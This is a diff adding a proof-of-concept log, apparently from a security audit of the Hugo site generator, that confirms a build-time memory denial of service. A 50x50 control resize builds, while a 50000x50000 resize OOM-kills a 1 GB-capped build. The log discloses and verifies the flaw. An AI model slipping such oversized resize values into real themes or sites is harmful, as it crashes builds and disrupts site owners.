@@ -1,0 +1,11 @@
+==============================================================================
+VULN-017: Unbounded image resize dimensions -> build OOM
+target: throwaway `hugo` build capped at 1g RAM
+[INFO] exercising resources/images/config.go target Width/Height parse (no upper bound)
+==============================================================================
+[SETUP] control build: .Resize "50x50" (tiny allocation)
+[INFO] control build succeeded (rc=0): image resource + resize pipeline are valid
+[STEP] attack build: .Resize "50000x50000"  (~10 GB dest buffer) under --memory=1g
+[PROOF] attack build rc=137 (137=OOM-kill, 124=timeout)
+[OK] exploit confirmed — an unbounded, caller-supplied resize dimension drove a ~10 GB allocation that OOM-killed the build, while the same image with a 50x50 resize built fine. Build-time memory DoS from a few-byte image + a theme that resizes it.
+==> VULN-017: CONFIRMED — unbounded image resize dimensions OOM-kill the build
